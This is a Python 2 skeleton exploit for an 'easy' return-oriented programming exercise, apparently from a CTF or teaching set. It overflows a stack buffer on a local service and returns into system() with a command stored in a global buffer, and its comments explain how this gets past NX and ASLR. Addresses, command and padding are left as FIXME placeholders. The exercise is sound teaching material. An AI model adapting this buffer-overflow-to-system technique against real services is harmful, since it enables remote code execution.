#!/usr/bin/env python

# ROP - EASY - SKELETON EXPLOIT

import socket
import struct
import telnetlib

# address of system in the PLT
system_plt = 0x0 # FIXME

# address of the name buffer holding our command
namebuf_bss = 0x0 #FIXME

# the command we're passing to system
command = "" #FIXME

# the length of the stack buffer we're overflowing + the size of the saved ebp
paddinglength = 0x400 #FIXME

p = lambda v: struct.pack("<I", v)
u = lambda v: struct.unpack("<I", v)[0]

def interact():
	''' allow the user to interact with the stream directly, like netcat '''
	print "*** interact ***"
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def runtil(mesg, debug=False):
	''' read from the socket until mesg is found '''
	buf = ""
	while mesg not in buf:
		c = s.recv(1)
		if len(c) > 0 and debug:
			print c.encode('hex')
		buf += c

	return buf

s = socket.create_connection(("localhost", 3000))

# we get asked for a name here

runtil(": ")

# the name is placed into a global buffer, unaffected by ASLR
# we'll use this space to store a command we pass to system

s.send(command + "\n")

# now we are asked for a bio. this is where the vulnerability exists
# as there is no limit to how much data we can send. this data is stored
# on the stack and we can overflow this buffer to overwrite the saved 
# return address

runtil(":\n")

# Our binary is protected by NX pages and ASLR. This means we cannot
# execute data on the stack, like a traditional (read: oldschool) 
# stacksmashing attack. Additionally because of ASLR we do not know 
# at what address our stack is placed at. We'll use ROP (return-oriented programming) 
# to bypass both of these defenses

payload  = "A"*paddinglength # padding up to the saved return address
payload += p(system_plt)
payload += "JUNK"
payload += p(namebuf_bss)

# send our chain to smash the stack and return to system with namebuf as an arg
s.send(payload + "\n")

interact()
